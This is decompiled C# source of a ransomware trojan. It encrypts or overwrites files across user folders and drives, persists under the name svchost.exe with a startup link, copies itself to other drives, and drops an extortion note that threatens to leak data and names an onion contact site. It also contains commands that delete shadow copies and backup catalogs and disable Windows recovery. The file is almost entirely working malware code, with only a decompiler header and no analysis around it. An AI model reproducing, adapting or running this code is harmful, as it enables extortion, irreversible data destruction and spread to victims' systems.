// Decompiled with JetBrains decompiler
// Type: ConsoleApplication7.Program
// Assembly: amp, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AD803713-4871-4DE8-9E5B-68A128C11875
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.MSIL.Agent.gen-a7f09cfde433f3d47fc96502bf2b623ae5e7626da85d0a0130dcd19d1679af9b.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7
{
  internal class Program
  {
    private static string userName = Environment.UserName;
    private static string userDir = "C:\\Users\\";
    public static string appMutexRun = "7z459ajrk722yn8c5j4fg";
    public static bool encryptionAesRsa = true;
    public static string encryptedFileExtension = "ampkcz";
    private static bool checkSpread = true;
    private static string spreadName = "amp.exe";
    private static bool checkCopyRoaming = true;
    private static string processName = "svchost.exe";
    public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";
    private static bool checkStartupFolder = true;
    private static bool checkSleep = false;
    private static int sleepTextbox = 10;
    private static string base64Image = "#base64Image";
    public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";
    private static string droppedMessageTextbox = "readme.txt";
    private static bool checkAdminPrivilage = false;
    private static bool checkdeleteShadowCopies = false;
    private static bool checkdisableRecoveryMode = false;
    private static bool checkdeleteBackupCatalog = false;
    public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";
    public static string appMutex2 = Program.appMutexStartup2 + Program.appMutexRun2;
    public static string staticSplit = "bc";
    public static string appMutex = Program.staticSplit + Program.appMutexStartup + Program.appMutexRun;
    public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");
    private static string[] messages = new string[33]
    {
      "All of your files are currently encrypted by ONYX strain.",
      "",
      "As you already know, all of your data has been encrypted by our software. ",
      "It cannot be recovered by any means without contacting our team directly.",
      "",
      "DON'T TRY TO RECOVER your data by yourselves. Any attempt to recover your data (including the usage of the additional recovery software) can damage your files. However,",
      "if you want to try - we recommend choosing the data of the lowest value.",
      "",
      "DON'T TRY TO IGNORE us. We've downloaded a pack of your internal data and are ready to publish it on our news website if you do not respond. ",
      "So it will be better for both sides if you contact us as soon as possible.",
      "",
      "DON'T TRY TO CONTACT feds or any recovery companies. ",
      "We have our informants in these structures, so any of your complaints will be immediately directed to us. ",
      "So if you will hire any recovery company for negotiations or send requests to the FBI, we will consider this as a hostile intent and initiate the publication of whole compromised data immediately.",
      "",
      "To prove that we REALLY CAN get your data back - we offer you to decrypt two random files completely free of charge.",
      "",
      "You can contact our team directly for further instructions through our website :",
      "",
      "TOR VERSION :",
      "(you should download and install TOR browser first https://torproject.org)",
      "",
      "http://ibpwmfrlbwkfd4asg57t4x2vkrczuq3uhrfxf6y35xoalwjlztil54ad.onion",
      "",
      "Login: ampkcz",
      "Password: fgh5RgsW73F",
      "",
      "",
      "YOU SHOULD BE AWARE!",
      "We will speak only with an authorized person. It can be the CEO, top management, etc. ",
      "In case you are not such a person - DON'T CONTACT US! Your decisions and action can result in serious harm to your company! ",
      "Inform your supervisors and stay calm!",
      ""
    };
    private static string[] validExtensions = new string[266]
    {
      ".txt",
      ".jar",
      ".dat",
      ".contact",
      ".settings",
      ".doc",
      ".docx",
      ".xls",
      ".xlsx",
      ".ppt",
      ".pptx",
      ".odt",
      ".jpg",
      ".mka",
      ".mhtml",
      ".oqy",
      ".png",
      ".csv",
      ".py",
      ".sql",
      ".mdb",
      ".php",
      ".asp",
      ".aspx",
      ".html",
      ".htm",
      ".xml",
      ".psd",
      ".pdf",
      ".xla",
      ".cub",
      ".dae",
      ".indd",
      ".cs",
      ".mp3",
      ".mp4",
      ".dwg",
      ".zip",
      ".rar",
      ".mov",
      ".rtf",
      ".bmp",
      ".mkv",
      ".avi",
      ".apk",
      ".url",
      ".dib",
      ".dic",
      ".dif",
      ".divx",
      ".iso",
      ".7zip",
      ".ace",
      ".arj",
      ".bz2",
      ".cab",
      ".gzip",
      ".lzh",
      ".tar",
      ".jpeg",
      ".xz",
      ".mpeg",
      ".torrent",
      ".mpg",
      ".core",
      ".pdb",
      ".ico",
      ".pas",
      ".db",
      ".wmv",
      ".swf",
      ".cer",
      ".bak",
      ".backup",
      ".accdb",
      ".bay",
      ".p7c",
      ".exif",
      ".vss",
      ".raw",
      ".m4a",
      ".wma",
      ".flv",
      ".sie",
      ".sum",
      ".ibank",
      ".wallet",
      ".css",
      ".js",
      ".rb",
      ".crt",
      ".xlsm",
      ".xlsb",
      ".7z",
      ".cpp",
      ".java",
      ".jpe",
      ".ini",
      ".blob",
      ".wps",
      ".docm",
      ".wav",
      ".3gp",
      ".webm",
      ".m4v",
      ".amv",
      ".m4p",
      ".svg",
      ".ods",
      ".bk",
      ".vdi",
      ".vmdk",
      ".onepkg",
      ".accde",
      ".jsp",
      ".json",
      ".gif",
      ".log",
      ".gz",
      ".config",
      ".vb",
      ".m1v",
      ".sln",
      ".pst",
      ".obj",
      ".xlam",
      ".djvu",
      ".inc",
      ".cvs",
      ".dbf",
      ".tbi",
      ".wpd",
      ".dot",
      ".dotx",
      ".xltx",
      ".pptm",
      ".potx",
      ".potm",
      ".pot",
      ".xlw",
      ".xps",
      ".xsd",
      ".xsf",
      ".xsl",
      ".kmz",
      ".accdr",
      ".stm",
      ".accdt",
      ".ppam",
      ".pps",
      ".ppsm",
      ".1cd",
      ".3ds",
      ".3fr",
      ".3g2",
      ".accda",
      ".accdc",
      ".accdw",
      ".adp",
      ".ai",
      ".ai3",
      ".ai4",
      ".ai5",
      ".ai6",
      ".ai7",
      ".ai8",
      ".arw",
      ".ascx",
      ".asm",
      ".asmx",
      ".avs",
      ".bin",
      ".cfm",
      ".dbx",
      ".dcm",
      ".dcr",
      ".pict",
      ".rgbe",
      ".dwt",
      ".f4v",
      ".exr",
      ".kwm",
      ".max",
      ".mda",
      ".mde",
      ".mdf",
      ".mdw",
      ".mht",
      ".mpv",
      ".msg",
      ".myi",
      ".nef",
      ".odc",
      ".geo",
      ".swift",
      ".odm",
      ".odp",
      ".oft",
      ".orf",
      ".pfx",
      ".p12",
      ".pl",
      ".pls",
      ".safe",
      ".tab",
      ".vbs",
      ".xlk",
      ".xlm",
      ".xlt",
      ".xltm",
      ".svgz",
      ".slk",
      ".tar.gz",
      ".dmg",
      ".ps",
      ".psb",
      ".tif",
      ".rss",
      ".key",
      ".vob",
      ".epsp",
      ".dc3",
      ".iff",
      ".onepkg",
      ".onetoc2",
      ".opt",
      ".p7b",
      ".pam",
      ".r3d",
      ".dsn",
      ".dmp",
      ".qbw",
      ".imr",
      ".nd",
      ".chw",
      ".spi",
      ".ep",
      ".tlg",
      ".qbb",
      ".msi",
      ".eml",
      ".thmx",
      ".obi",
      ".chm",
      ".pub",
      ".md5",
      ".spf",
      ".spk",
      ".idx",
      ".scc",
      ".jdk",
      ".cnt",
      ".tum",
      ".dsm",
      ".reg",
      ".cfg",
      ".ldf",
      ".bat",
      ".dxf",
      ".SLDDRW",
      ".SLDPRT",
      ".SLDASM",
      ".mil",
      ".dlf",
      ".c4",
      ".pdx"
    };
    private static Random random = new Random();

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      uint action,
      uint uParam,
      string vParam,
      uint winIni);

    private static void Main(string[] args)
    {
      if (Program.AlreadyRunning())
        Environment.Exit(1);
      if (Program.checkSleep)
        Program.sleepOutOfTempFolder();
      if (Program.checkAdminPrivilage)
        Program.copyResistForAdmin(Program.processName);
      else if (Program.checkCopyRoaming)
        Program.copyRoaming(Program.processName);
      if (Program.checkStartupFolder)
        Program.addLinkToStartup();
      Program.lookForDirectories();
      if (Program.checkAdminPrivilage)
      {
        if (Program.checkdeleteShadowCopies)
          Program.deleteShadowCopies();
        if (Program.checkdisableRecoveryMode)
          Program.disableRecoveryMode();
        if (Program.checkdeleteBackupCatalog)
          Program.deleteBackupCatalog();
      }
      if (Program.checkSpread)
        Program.spreadIt(Program.spreadName);
      Program.addAndOpenNote();
      Program.SetWallpaper(Program.base64Image);
      new Thread((ThreadStart) (() => Program.Run())).Start();
    }

    public static void Run() => Application.Run((Form) new driveNotification.NotificationForm());

    private static void sleepOutOfTempFolder()
    {
      if (!(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) != Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
        return;
      Thread.Sleep(Program.sleepTextbox * 1000);
    }

    private static bool AlreadyRunning()
    {
      Process[] processes = Process.GetProcesses();
      Process currentProcess = Process.GetCurrentProcess();
      foreach (Process process in processes)
      {
        try
        {
          if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location)
          {
            if (currentProcess.Id != process.Id)
              return true;
          }
        }
        catch (Exception ex)
        {
        }
      }
      return false;
    }

    public static byte[] random_bytes(int length)
    {
      Random random = new Random();
      ++length;
      byte[] buffer = new byte[length];
      random.NextBytes(buffer);
      return buffer;
    }

    public static string RandomString(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < length; ++index)
      {
        char ch = "abcdefghijklmnopqrstuvwxyz0123456789"[Program.random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
        stringBuilder.Append(ch);
      }
      return stringBuilder.ToString();
    }

    public static string RandomStringForExtension(int length)
    {
      if (!(Program.encryptedFileExtension == ""))
        return Program.encryptedFileExtension;
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < length; ++index)
      {
        char ch = "abcdefghijklmnopqrstuvwxyz0123456789"[Program.random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
        stringBuilder.Append(ch);
      }
      return stringBuilder.ToString();
    }

    public static string Base64EncodeString(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    public static string randomEncode(string plainText)
    {
      byte[] bytes = Encoding.UTF8.GetBytes(plainText);
      return "<EncyptedKey>" + Program.Base64EncodeString(Program.RandomString(41)) + "<EncyptedKey> " + Program.RandomString(2) + Convert.ToBase64String(bytes);
    }

    private static void encryptDirectory(string location)
    {
      try
      {
        string[] files = Directory.GetFiles(location);
        bool flag = true;
        for (int index = 0; index < files.Length; ++index)
        {
          try
          {
            string extension = Path.GetExtension(files[index]);
            string fileName = Path.GetFileName(files[index]);
            if (Array.Exists<string>(Program.validExtensions, (Predicate<string>) (E => E == extension.ToLower())))
            {
              if (fileName != Program.droppedMessageTextbox)
              {
                FileInfo fileInfo = new FileInfo(files[index]);
                fileInfo.Attributes = FileAttributes.Normal;
                if (fileInfo.Length < 2117152L)
                {
                  if (Program.encryptionAesRsa)
                    Program.EncryptFile(files[index]);
                }
                else if (fileInfo.Length > 200000000L)
                {
                  string plainText = Encoding.UTF8.GetString(Program.random_bytes(new Random().Next(200000000, 300000000)));
                  File.WriteAllText(files[index], Program.randomEncode(plainText));
                  File.Move(files[index], files[index] + "." + Program.RandomStringForExtension(4));
                }
                else
                {
                  string plainText = Encoding.UTF8.GetString(Program.random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
                  File.WriteAllText(files[index], Program.randomEncode(plainText));
                  File.Move(files[index], files[index] + "." + Program.RandomStringForExtension(4));
                }
                if (flag)
                {
                  flag = false;
                  File.WriteAllLines(location + "/" + Program.droppedMessageTextbox, Program.messages);
                }
              }
            }
          }
          catch
          {
          }
        }
        foreach (string directory in Directory.GetDirectories(location))
          Program.encryptDirectory(directory);
      }
      catch (Exception ex)
      {
      }
    }

    public static string rsaKey()
    {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
      stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
      stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
      stringBuilder.AppendLine("  <Modulus>yq1H5HRguL8Cui6dtILZz18EH07gKukq7e4hYr7mR5EkROEZztFDnHWCtQdKmfG7rsb30lfuLkacsi2qjvbt6KZ2s7tl6PjzE9dYIhOMD93Z6KzX+VgWbEkQA1eFcjnsFUZXJPCNu1ZJz0juk1vDaDCAlbfkcAjRYKny9syZq1k=</Modulus>");
      stringBuilder.AppendLine("</RSAParameters>");
      return stringBuilder.ToString();
    }

    public static string CreatePassword(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
      return stringBuilder.ToString();
    }

    public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          return memoryStream.ToArray();
        }
      }
    }

    public static void EncryptFile(string file)
    {
      byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
      string password = Program.CreatePassword(20);
      byte[] bytes = Encoding.UTF8.GetBytes(password);
      byte[] inArray = Program.AES_Encrypt(bytesToBeEncrypted, bytes);
      File.WriteAllText(file, "<EncryptedKey>" + Program.RSAEncrypt(password, Program.rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
      File.Move(file, file + "." + Program.RandomStringForExtension(4));
    }

    public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
    {
      byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(1024))
      {
        try
        {
          cryptoServiceProvider.FromXmlString(publicKeyString.ToString());
          return Convert.ToBase64String(cryptoServiceProvider.Encrypt(bytes, true));
        }
        finally
        {
          cryptoServiceProvider.PersistKeyInCsp = false;
        }
      }
    }

    private static void lookForDirectories()
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.ToString() != "C:\\")
          Program.encryptDirectory(drive.ToString());
      }
      string location1 = Program.userDir + Program.userName + "\\Desktop";
      string location2 = Program.userDir + Program.userName + "\\Links";
      string location3 = Program.userDir + Program.userName + "\\Contacts";
      string location4 = Program.userDir + Program.userName + "\\Desktop";
      string location5 = Program.userDir + Program.userName + "\\Documents";
      string location6 = Program.userDir + Program.userName + "\\Downloads";
      string location7 = Program.userDir + Program.userName + "\\Pictures";
      string location8 = Program.userDir + Program.userName + "\\Music";
      string location9 = Program.userDir + Program.userName + "\\OneDrive";
      string location10 = Program.userDir + Program.userName + "\\Saved Games";
      string location11 = Program.userDir + Program.userName + "\\Favorites";
      string location12 = Program.userDir + Program.userName + "\\Searches";
      string location13 = Program.userDir + Program.userName + "\\Videos";
      Program.encryptDirectory(location1);
      Program.encryptDirectory(location2);
      Program.encryptDirectory(location3);
      Program.encryptDirectory(location4);
      Program.encryptDirectory(location5);
      Program.encryptDirectory(location6);
      Program.encryptDirectory(location7);
      Program.encryptDirectory(location8);
      Program.encryptDirectory(location9);
      Program.encryptDirectory(location10);
      Program.encryptDirectory(location11);
      Program.encryptDirectory(location12);
      Program.encryptDirectory(location13);
      Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
      Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
      Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
      Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
      Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
      Program.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
    }

    private static void copyRoaming(string processName)
    {
      string str1 = processName;
      string friendlyName = AppDomain.CurrentDomain.FriendlyName;
      string location = Assembly.GetExecutingAssembly().Location;
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
      string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      string str4 = str3 + str1;
      if (!(friendlyName != str1) && !(location != str4))
        return;
      if (!File.Exists(str4))
      {
        File.Copy(friendlyName, str4);
        if (!new Process()
        {
          StartInfo = new ProcessStartInfo(str4)
          {
            WorkingDirectory = str3
          }
        }.Start())
          return;
        Environment.Exit(1);
      }
      else
      {
        try
        {
          File.Delete(str4);
          Thread.Sleep(200);
          File.Copy(friendlyName, str4);
        }
        catch
        {
        }
        if (!new Process()
        {
          StartInfo = new ProcessStartInfo(str4)
          {
            WorkingDirectory = str3
          }
        }.Start())
          return;
        Environment.Exit(1);
      }
    }

    private static void copyResistForAdmin(string processName)
    {
      string str1 = processName;
      string friendlyName = AppDomain.CurrentDomain.FriendlyName;
      string location = Assembly.GetExecutingAssembly().Location;
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
      string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      string str4 = str3 + str1;
      ProcessStartInfo startInfo = new ProcessStartInfo(str4)
      {
        UseShellExecute = true,
        Verb = "runas",
        WindowStyle = ProcessWindowStyle.Normal,
        WorkingDirectory = str3
      };
      new Process().StartInfo = startInfo;
      if (!(friendlyName != str1) && !(location != str4))
        return;
      if (!File.Exists(str4))
      {
        File.Copy(friendlyName, str4);
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode != 1223)
            return;
          Program.copyResistForAdmin(processName);
        }
      }
      else
      {
        try
        {
          File.Delete(str4);
          Thread.Sleep(200);
          File.Copy(friendlyName, str4);
        }
        catch
        {
        }
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode != 1223)
            return;
          Program.copyResistForAdmin(processName);
        }
      }
    }

    private static void addLinkToStartup()
    {
      using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Process.GetCurrentProcess().ProcessName + ".url"))
      {
        string location = Assembly.GetExecutingAssembly().Location;
        streamWriter.WriteLine("[InternetShortcut]");
        streamWriter.WriteLine("URL=file:///" + location);
        streamWriter.WriteLine("IconIndex=0");
        string str = location.Replace('\\', '/');
        streamWriter.WriteLine("IconFile=" + str);
      }
    }

    private static void addAndOpenNote()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.droppedMessageTextbox;
      try
      {
        File.WriteAllLines(str, Program.messages);
        Thread.Sleep(500);
        Process.Start(str);
      }
      catch
      {
      }
    }

    private static void registryStartup()
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Microsoft Store", (object) Assembly.GetExecutingAssembly().Location);
      }
      catch
      {
      }
    }

    private static void spreadIt(string spreadName)
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.ToString() != "C:\\")
        {
          if (!File.Exists(drive.ToString() + spreadName))
          {
            try
            {
              File.Copy(Assembly.GetExecutingAssembly().Location, drive.ToString() + spreadName);
            }
            catch
            {
            }
          }
        }
      }
    }

    private static void runCommand(string commands)
    {
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        Arguments = "/C " + commands,
        WindowStyle = ProcessWindowStyle.Hidden
      };
      process.Start();
      process.WaitForExit();
    }

    private static void deleteShadowCopies() => Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");

    private static void disableRecoveryMode() => Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");

    private static void deleteBackupCatalog() => Program.runCommand("wbadmin delete catalog -quiet");

    public static void SetWallpaper(string base64)
    {
      if (!(base64 != ""))
        return;
      try
      {
        string str = Path.GetTempPath() + Program.RandomString(9) + ".jpg";
        File.WriteAllBytes(str, Convert.FromBase64String(base64));
        Program.SystemParametersInfo(20U, 0U, str, 3U);
      }
      catch
      {
      }
    }

    public static class NativeMethods
    {
      public const int clp = 797;
      public static IntPtr intpreclp = new IntPtr(-3);

      [DllImport("user32.dll", SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool AddClipboardFormatListener(IntPtr hwnd);

      [DllImport("user32.dll", SetLastError = true)]
      public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
    }
  }
}
